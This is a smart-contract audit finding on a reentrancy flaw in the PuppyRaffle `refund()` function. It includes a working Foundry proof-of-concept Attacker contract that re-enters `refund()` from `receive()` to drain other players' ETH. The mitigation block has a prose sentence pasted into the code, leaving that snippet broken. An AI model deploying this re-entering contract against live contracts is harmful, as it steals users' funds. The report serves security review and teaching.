## Reentrancy Allows Player to Drain ETH via `refund()`
Matched: [H-02] Reentrancy Vulnerability In `refund()` function

## Root + Impact Description
The `refund()` function contains a reentrancy vulnerability that lets an attacker drain the contract's ETH balance. The function sends ETH before updating state, which means a malicious contract can recursively call back into `refund()` and withdraw the same ticket multiple times.
```solidity
payable(msg.sender).sendValue(entranceFee);
players[playerIndex] = address(0);  // State updated AFTER external call
```

## Risk
**Likelihood:**
The function violates the Checks-Effects-Interactions pattern by performing the external ETH transfer before marking the player slot as refunded.
This ordering allows a malicious contract to re-enter through its `receive()` or `fallback()` function while `players[playerIndex]` still contains a valid address, bypassing the duplicate refund check.

**Impact:**
An attacker can drain the contract's ETH balance by recursively refunding the same ticket. This directly steals funds that belong to other participants and breaks the core invariant that each ticket can only be refunded once.

## Proof of Concept
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
​
import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";
​
contract RefundReentrancyTest is Test {
    PuppyRaffle raffle;
    Attacker attacker;
​
    uint256 constant ENTRANCE_FEE = 1 ether;
​
    function setUp() public {
        raffle = new PuppyRaffle(ENTRANCE_FEE, address(0xfee), 1 days);
        attacker = new Attacker(raffle);
​
        vm.deal(address(attacker), 10 ether);
​
        // Add honest players to provide balance
        address[] memory players = new address[](3);
        players[0] = address(0xA);
        players[1] = address(0xB);
        players[2] = address(0xC);
​
        vm.deal(address(this), 10 ether);
        raffle.enterRaffle{value: 3 ether}(players);
    }
​
    function test_ReentrancyDrainsFunds() public {
        attacker.enter{value: ENTRANCE_FEE}();
​
        uint256 beforeBal = address(raffle).balance;
        attacker.attack();
        uint256 afterBal = address(raffle).balance;
​
        // Attacker withdrew more than they deposited
        assertLt(afterBal, beforeBal - ENTRANCE_FEE);
        assertGt(address(attacker).balance, ENTRANCE_FEE);
    }
}
​
contract Attacker {
    PuppyRaffle raffle;
    uint256 index;
    bool reenter;
​
    constructor(PuppyRaffle _raffle) {
        raffle = _raffle;
    }
​
    function enter() external payable {
        address[] memory p = new address[](1);
        p[0] = address(this);
        raffle.enterRaffle{value: msg.value}(p);
        index = raffle.getActivePlayerIndex(address(this));
    }
​
    function attack() external {
        reenter = true;
        raffle.refund(index);
        reenter = false;
    }
​
    receive() external payable {
        if (reenter && address(raffle).balance >= raffle.entranceFee()) {
            raffle.refund(index);
        }
    }
}
```
The external call occurs before the state update. A malicious contract can re-enter `refund()` from `receive()` while `players[playerIndex]` is still non-zero, passing the checks repeatedly and receiving multiple payouts.

## Recommended Mitigation
Update state before making the external call:
Alternatively, add a reentrancy guard from OpenZeppelin's ReentrancyGuard.
```solidity
players[playerIndex] = address(0);
emit RaffleRefunded(playerAddress);
payable(msg.sender).sendValue(entranceFee);Alternatively, add a reentrancy guard from OpenZeppelin's ReentrancyGuard.
```
